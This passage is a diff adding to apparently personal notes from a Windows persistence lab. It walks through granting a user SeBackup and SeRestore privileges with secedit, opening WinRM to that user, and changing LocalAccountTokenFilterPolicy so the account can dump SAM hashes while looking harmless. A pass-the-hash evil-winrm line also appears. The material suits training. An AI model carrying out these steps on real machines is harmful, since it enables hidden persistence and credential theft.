@@ -83,3 +83,41 @@ user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e890
 A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself.
 
 
+In the case of the Backup Operators group, it has the following two privileges assigned by default:
+
+- **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
+- **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.
+
+- We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:
+```powershell
+secedit /export /cfg config.inf
+```
+We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:
+
+- We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
+```powershell
+secedit /import /cfg config.inf /db config.sdb
+```
+
+```Powershell
+secedit /configure /db config.sdb /cfg config.inf
+```
+
+- To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this)
+```powershell
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+```
+*Note*: This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:
+
+Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.
+
+Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy**
+
+```Command Prompt
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+```
+
+- If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
+```powershell
+net user thmuser2
+```
